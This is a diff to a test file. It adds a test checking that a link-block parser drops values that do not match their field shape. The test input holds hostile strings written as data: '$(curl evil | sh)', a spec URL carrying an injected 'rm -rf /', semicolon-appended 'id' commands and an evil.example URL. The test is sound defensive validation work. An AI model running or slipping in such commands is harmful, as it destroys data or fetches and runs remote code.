@@ -63,3 +63,21 @@ test('links: a malformed line is ignored, the rest of the block survives', () =>
   const text = '<!-- adlc-links v1\nnot a field line\nspec_pr: https://github.com/o/r/pull/9\n-->';
   assert.deepEqual(parseLinks(text), { spec_pr: 'https://github.com/o/r/pull/9' });
 });
+
+test('links: values that do not match their field shape are dropped — never passed to a shell', () => {
+  const hostile = [
+    '<!-- adlc-links v1',
+    'implementation_pr: $(curl evil | sh)',
+    'implementation_pr: https://evil.example/pull/1',
+    "spec_pr: https://github.com/o/r/pull/12'; rm -rf /; '",
+    'openspec_change: openspec/changes/x;id',
+    'depth: two',
+    'repro_run: 123; id',
+    'unknown_key: anything',
+    'implementation_pr: https://github.com/o/r/pull/34',
+    '-->',
+  ].join('\n');
+  assert.deepEqual(parseLinks(hostile), {
+    implementation_pr: ['https://github.com/o/r/pull/34'],
+  });
+});
